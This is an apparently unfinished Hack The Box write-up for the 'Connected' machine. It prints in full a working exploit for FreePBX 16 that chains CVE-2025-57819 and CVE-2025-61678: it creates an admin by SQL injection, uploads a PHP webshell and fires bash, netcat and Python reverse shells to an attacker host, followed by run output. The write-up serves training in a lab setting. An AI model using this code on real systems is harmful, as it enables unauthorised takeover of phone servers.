---
tags:
  - SN_11
link: https://app.hackthebox.com/machines/Connected
description: Easy·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5f828febf436aa997dff714a184614fe.png
solve date: 2026-06-07
solved: true
machine no.: 3
---
<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/HTB Logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Connected Writeup</p></div>

  <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5f828febf436aa997dff714a184614fe.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Machine Author(s): PJ131</p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 16 June 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

You can confirm your VPN tunnel is up before you touch the target.

Command: `ip a | grep tun0`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2 Verifying the Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ ping -c 4 TARGET_IP          
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=247 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=213 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=212 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=213 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 211.856/221.311/246.876/14.771 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 The "Spearfishing" Scan (All Ports, High Speed)

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 09:58 -0400
Nmap scan report for TARGET_IP
Host is up (0.44s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 29.02 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ nmap -A -p 22,80,443 TARGET_IP        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 10:00 -0400
Nmap scan report for TARGET_IP
Host is up (0.22s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   221.34 ms 10.10.14.1
2   222.89 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.11 seconds

```
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port | Service | Version                                 | Analysis                                                                                                                                                                                                                                                                                 |
| ---- | ------- | --------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | SSH     | OpenSSH 7.4 (protocol 2.0)              | Standard remote-administration service. Useful later for lateral movement once credentials are obtained, or to confirm a foothold survives.                                                                                                                                              |
| 80   | HTTP    | Apache httpd 2.4.6 (CentOS), PHP 7.4.16 | Hosts the FreePBX web administration interface. The CentOS/Sangoma stack and the `config.php` redirect strongly indicate FreePBX — confirmed later as version 16.0.40.7, which is vulnerable to **CVE-2025-57819** (unauthenticated SQLi → RCE). This becomes the primary attack vector. |
| 443  | HTTPS   | Apache/2.4.6 (CentOS), same PHP stack   | TLS-wrapped copy of the same web application; the certificate CN `pbxconnect` further corroborates the FreePBX/Sangoma identification and gives a hint toward the machine's theme ("Connected").                                                                                         |

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2 Enumeration of Web Services

#### 2.2.1 Update Hosts File

**Command:** `echo "TARGET_IP  connected.htb" | sudo tee -a /etc/hosts`

**Breakdown:**

- `echo "TARGET_IP connected.htb"`
  - **Description:** Prints a hostname-to-IP mapping line in the format `/etc/hosts` expects.
  - **Purpose:** Generates the exact line needed to register the target under a friendly hostname.
- `sudo tee -a /etc/hosts`
  - **Description:** `tee` writes standard input both to the terminal and to a file; `-a` appends rather than overwrites; `sudo` provides the root privilege required to modify a system file.
  - **Purpose:** Appends the new mapping to `/etc/hosts` without clobbering existing entries, which is necessary because root ownership prevents a normal redirect (`>>`) from a non-root shell.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.2 Web Enumeration

Browse to `http://connected.htb`.

The root path immediately 302-redirects to `http://connected.htb/admin/config.php`.

![[Pasted image 20260616185544.png]]

Look at the footer of that page:

```
FreePBX is a registered trademark of
Sangoma Technologies Inc.
FreePBX 16.0.40.7 is licensed under the GPL
Copyright© 2007-2026
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.3 Vulnerability Research and Analysis

**Search Query:** `FreePBX 16.0.40.7 cves`

![[Google Search - FreePBX 16.0.40.7 cves.png]]

A Google search for FreePBX 16.0.40.7 cves immediately surfaces two critical, public vulnerabilities affecting this exact version:

- `CVE-2025-57819` — Unauthenticated stacked SQL injection in `/admin/ajax.php` via the brand parameter in the endpoint module loader. Because the underlying MySQL connection permits multiple statements per query, an attacker can break out of the string context with a single quote and append arbitrary SQL — including INSERT statements — without any authentication whatsoever.
- `CVE-2025-61678` — Authenticated arbitrary file upload via path traversal in the Endpoint Manager firmware uploader (upload_cust_fw, fwbrand parameter). Once authenticated, an attacker can write arbitrary files outside the intended upload directory, including PHP files into the web root.

Chained together, these two CVEs form a complete unauthenticated RCE path: `CVE-2025-57819` injects a new admin account into the database, `CVE-2025-61678` leverages that account to drop a PHP webshell, and the webshell delivers a reverse shell.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation

### 3.1 Exploit Acquisition and Preparation

**Command:** `git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git`

![[Pasted image 20260617002656.png]]

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git                
Cloning into 'FreePBX-CVE-2025-57819-RCE'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 2), reused 6 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 6.45 KiB | 2.15 MiB/s, done.
Resolving deltas: 100% (2/2), done.

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ ls   
FreePBX-CVE-2025-57819-RCE  watchTowr-vs-FreePBX-CVE-2025-57819

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ cd FreePBX-CVE-2025-57819-RCE 

┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ ls
exploit.py  README.md
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.1.1 `exploit.py`

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ cat exploit.py
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#   FreePBX 16 unauthenticated SQLi -> admin -> authenticated file-upload RCE
#   Chains:
#     CVE-2025-57819  unauth stacked SQL injection (endpoint module loader, 'brand' param)
#     CVE-2025-61678  authenticated arbitrary file upload (endpoint 'upload_cust_fw', fwbrand traversal)
#
#   Flow:
#     1. Inject a brand-new FreePBX admin straight into the `ampusers` table via stacked SQLi (no auth).
#     2. Log into the FreePBX admin panel as that user.
#     3. Abuse the Endpoint Manager firmware uploader to drop a PHP webshell into the web root.
#     4. Run a single command (--command) or pop an interactive reverse shell (--lhost/--lport).
#
import argparse
import hashlib
import random
import string
import sys
import threading
import time

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[-] pip install requests")

BANNER = r"""
 ██████████ █████                  █████
░░███░░░░░█░░███                  ░░███
 ░███  █ ░  ░███████   █████ █████ ░███████
 ░██████    ░███░░███ ░░███ ░░███  ░███░░███
 ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
 ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
 ██████████ ████ █████ █████ █████ ████████
░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb
"""

# ---- pretty logging ------------------------------------------------------
def log(tag, msg, c=""):
    cols = {"+": "\033[92m", "-": "\033[91m", "*": "\033[94m", "!": "\033[93m"}
    r = "\033[0m"
    print(f"{cols.get(tag, '')}[{tag}]{r} {msg}")

def hx(s):
    """encode a python str/bytes as a MySQL 0x... hex literal (quote-free)."""
    if isinstance(s, str):
        s = s.encode()
    return "0x" + s.hex()

def rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class FreePBXExploit:
    def __init__(self, rhost, rport, ssl=True, timeout=30):
        scheme = "https" if ssl else "http"
        # omit the port when it's the default, otherwise FreePBX's Referer host check
        # (host vs host:port) rejects the upload with "ajaxRequest declined - Referrer"
        if (ssl and rport == 443) or (not ssl and rport == 80):
            self.base = f"{scheme}://{rhost}"
        else:
            self.base = f"{scheme}://{rhost}:{rport}"
        self.host = rhost
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({"User-Agent": "Mozilla/5.0"})
        self.user = "svc_" + rnd(5)
        self.password = rnd(12)
        self.shell_dir = rnd(10)
        self.shell_name = rnd(8) + ".php"

    # ---- step 1: CVE-2025-57819 stacked SQLi -> create admin -------------
    def _sqli(self, payload):
        """Send a stacked-query payload through the unauth endpoint loader."""
        params = {
            "module": r"FreePBX\modules\endpoint\ajax",
            "command": "model",
            "template": "x",
            "model": "model",
            "brand": payload,
        }
        return self.s.get(f"{self.base}/admin/ajax.php", params=params, timeout=self.timeout)

    def create_admin(self):
        log("*", f"[CVE-2025-57819] creating admin via stacked SQLi: {self.user}:{self.password}")
        sha1 = hashlib.sha1(self.password.encode()).hexdigest()
        # idempotent: drop any leftover, then insert with full ('*') section access
        self._sqli(f"x'; DELETE FROM asterisk.ampusers WHERE username={hx(self.user)}-- -")
        self._sqli(
            "x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections) "
            f"VALUES ({hx(self.user)},{hx(sha1)},0x2a)-- -"
        )
        log("+", "admin row inserted into ampusers")

    # ---- step 2: authenticate ------------------------------------------
    def login(self):
        log("*", "logging into FreePBX admin panel")
        self.s.get(f"{self.base}/admin/config.php", timeout=self.timeout)
        r = self.s.post(
            f"{self.base}/admin/config.php",
            data={"username": self.user, "password": self.password},
            timeout=self.timeout,
        )
        if "Logout" in r.text or "Dashboard" in r.text or "nav-tabs" in r.text:
            log("+", "authenticated as " + self.user)
            return True
        # fall back: hit the dashboard to confirm a live session
        r = self.s.get(f"{self.base}/admin/config.php", timeout=self.timeout)
        if "Logout" in r.text:
            log("+", "authenticated as " + self.user)
            return True
        log("-", "login failed")
        return False

    # ---- step 3: CVE-2025-61678 file-upload -> webshell -----------------
    def upload_shell(self):
        log("*", f"[CVE-2025-61678] uploading webshell -> /{self.shell_dir}/{self.shell_name}")
        webshell = b'<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>'
        files = {
            "dzuuid": (None, "48069f49-c03e-4182-81f7-48e36622e0d3"),
            "dzchunkindex": (None, "0"),
            "dztotalfilesize": (None, str(len(webshell))),
            "dzchunksize": (None, "2000000"),
            "dztotalchunkcount": (None, "1"),
            "dzchunkbyteoffset": (None, "0"),
            # traversal out of /tftpboot/customfw/ into the web root; new dir so mkdir() succeeds
            "fwbrand": (None, f"../../../var/www/html/{self.shell_dir}"),
            "fwmodel": (None, "1"),
            "fwversion": (None, "1"),
            "file": (self.shell_name, webshell, "application/x-php"),
        }
        headers = {
            "Referer": f"{self.base}/admin/config.php?display=epm_advanced",
            "X-Requested-With": "XMLHttpRequest",
        }
        # the handler throws a non-fatal unlink/mkdir warning AFTER writing the file -> ignore status
        self.s.post(
            f"{self.base}/admin/ajax.php?module=endpoint&command=upload_cust_fw",
            files=files, headers=headers, timeout=self.timeout,
        )
        self.shell_url = f"{self.base}/{self.shell_dir}/{self.shell_name}"
        if self.run_cmd("echo EHXB_$((1+1))").strip().endswith("EHXB_2"):
            log("+", f"webshell live: {self.shell_url}")
            return True
        log("-", "webshell not reachable")
        return False

    # ---- step 4a: single command ---------------------------------------
    def run_cmd(self, cmd):
        try:
            r = self.s.get(self.shell_url, params={"cmd": cmd}, timeout=self.timeout)
            return r.text.replace("<pre>", "").replace("</pre>", "")
        except Exception:
            return ""

    # ---- step 4b: interactive reverse shell ----------------------------
    def reverse_shell(self, lhost, lport):
        payloads = [
            f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
            f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")\'',
        ]
        log("*", f"firing reverse shell -> {lhost}:{lport}")
        for p in payloads:
            threading.Thread(target=self.run_cmd, args=(p,), daemon=True).start()
            time.sleep(0.5)


def main():
    print(BANNER)
    ap = argparse.ArgumentParser(
        description="FreePBX 16 unauth SQLi -> admin -> RCE (CVE-2025-57819 + CVE-2025-61678)")
    ap.add_argument("--rhost", required=True, help="target host (e.g. pbx.example.com)")
    ap.add_argument("--rport", type=int, default=443, help="target port (default 443)")
    ap.add_argument("--http", action="store_true", help="use plain HTTP instead of HTTPS")
    ap.add_argument("--lhost", help="attacker IP for reverse shell")
    ap.add_argument("--lport", type=int, help="attacker port for reverse shell")
    ap.add_argument("--command", help="run a single command instead of a reverse shell")
    args = ap.parse_args()

    x = FreePBXExploit(args.rhost, args.rport, ssl=not args.http)

    x.create_admin()
    if not x.login():
        sys.exit(1)
    if not x.upload_shell():
        sys.exit(1)

    # mode: single command
    if args.command:
        log("*", f"executing: {args.command}")
        print(x.run_cmd(args.command))
        return

    # mode: reverse shell (auto-listener via pwntools if available)
    if args.lhost and args.lport:
        try:
            from pwn import listen
            l = listen(args.lport)
            time.sleep(1)
            x.reverse_shell(args.lhost, args.lport)
            l.wait_for_connection()
            log("+", "shell incoming! dropping to interactive")
            l.interactive()
        except ImportError:
            log("!", "pwntools not found - start your own listener:")
            log("!", f"    nc -lvnp {args.lport}")
            input("[*] press ENTER once your listener is ready...")
            x.reverse_shell(args.lhost, args.lport)
            log("*", "payload sent, check your listener")
        return

    # default: confirm RCE
    log("+", "RCE confirmed as: " + x.run_cmd("id").strip())
    log("!", "use --command '<cmd>' or --lhost/--lport for a shell")


if __name__ == "__main__":
    main()
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.2.2 Code Breakdown
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.2.3 Exploit Preparation

Before launching the exploit, start a netcat listener on you attack machine to catch the incoming reverse shell callback:

**Command:** `nc -lvnp 4444`

**Breakdown:**

- `nc`
  - Description: Netcat — a general-purpose TCP/UDP networking utility.
  - Purpose: Provides the listening endpoint that the target's reverse-shell payload will connect back to.
- `-l`
  - Description: Listen mode — waits for an inbound connection rather than initiating one.
  - Purpose: Required to passively receive the callback from the exploited host.
- `-v`
  - Description: Verbose mode — prints connection status messages.
  - Purpose: Confirms exactly when and from where a connection arrives, which is the primary indicator that the exploit succeeded.
- `-n`
  - Description: Skips DNS resolution.
  - Purpose: Speeds up connection handling and avoids unnecessary DNS lookups.
- `-p 4444`
  - Description: Specifies the local TCP port to listen on.
  - Purpose: Must match the --lport value passed to the exploit script so the reverse shell connects to the correct place.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ nc -lvnp 4444                      
listening on [any] 4444 ...
```

The listener is active and waiting for an inbound connection on port `4444`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Exploit Execution

Before running the script, note the target's login endpoint has ~220ms RTT due to VPN latency.

==what is this latency thingy?==

Increase the script's default timeout from 30 seconds to 90 seconds.

Before:

```python
    def __init__(self, rhost, rport, ssl=True, timeout=30):
```

After:

```python
    def __init__(self, rhost, rport, ssl=True, timeout=90):
```

Now run the script against the target.

**Command:** `python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.85 --lport 4444`

**Breakdown:**

- `python3 exploit.py`
	- Description: Executes the 0xEhab PoC script with Python 3.
	- Purpose: Runs the chained CVE-2025-57819 + CVE-2025-61678 exploit against the confirmed-vulnerable FreePBX 16.0.40.7 instance.
- `--rhost connected.htb`
	- Description: The target hostname.
	- Purpose: Points the exploit at the FreePBX instance identified during enumeration. The hostname form is used rather than the raw IP because FreePBX's internal routing depends on the Host: header being consistent.
- `--rport 80`
	- Description: The target port.
	- Purpose: Targets the HTTP service confirmed open on port 80 during the Nmap scan.
- `--http`
	- Description: Forces the script to use plain HTTP instead of the default HTTPS.
	- Purpose: The HTTPS service on port 443 returned a 400 Bad Request during enumeration; port 80 served the FreePBX admin interface correctly.
- `--lhost 10.10.14.85`
	- Description: The attacker's listening IP address.
	- Purpose: Embedded into the reverse-shell one-liner so the compromised host knows where to connect back — this is the tun0 VPN address confirmed in section 1.1.
- `--lport 4444`
	- Description: The attacker's listening TCP port.
	- Purpose: Matches the port the nc listener is bound to.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.85 --lport 4444

 ██████████ █████                  █████
░░███░░░░░█░░███                  ░░███
 ░███  █ ░  ░███████   █████ █████ ░███████
 ░██████    ░███░░███ ░░███ ░░███  ░███░░███
 ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
 ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
 ██████████ ████ █████ █████ █████ ████████
░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb

[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_gseug:jx9g6yx9fahm
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_gseug
[*] [CVE-2025-61678] uploading webshell -> /1o0kbv2rey/98bc7nfu.php
[+] webshell live: http://connected.htb/1o0kbv2rey/98bc7nfu.php
[!] pwntools not found - start your own listener:
[!]     nc -lvnp 4444
[*] press ENTER once your listener is ready...
```

Press Enter

```shell
[*] firing reverse shell -> 10.10.14.85:4444
[*] payload sent, check your listener
```

The exploit completes all three phases successfully: the admin account is injected via SQL injection, authentication succeeded, the webshell is uploaded via path traversal and confirmed live, and the reverse shell payload is fired through it.

Check the listener terminal for the callback:

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.85] from (UNKNOWN) [TARGET_IP] 33588
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:9B:7D:94 | TARGET_IP             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected 1o0kbv2rey]$ 
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.3 Shell Stabilization

You can stabilize the shell with a command like `python -c 'import pty; pty.spawn("/bin/bash")'` or not. It's a quality of life thing, not a requirement.

Without stabilisation you can still run every command needed to complete the box — enumerate files, read flags, write payloads, trigger privesc. The only things you lose are arrow keys, tab completion, and the ability to run interactive programs like vi or su.

On a box like this where you're not doing anything that requires a true TTY, skipping it is perfectly fine. Most experienced pentesters stabilize out of habit because a broken shell gets annoying fast, but it's never mandatory.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation

### 4.1 User Flag

Search the file system for the user flag.

**Command:** `find / -name 'user.txt' 2>/dev/null`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

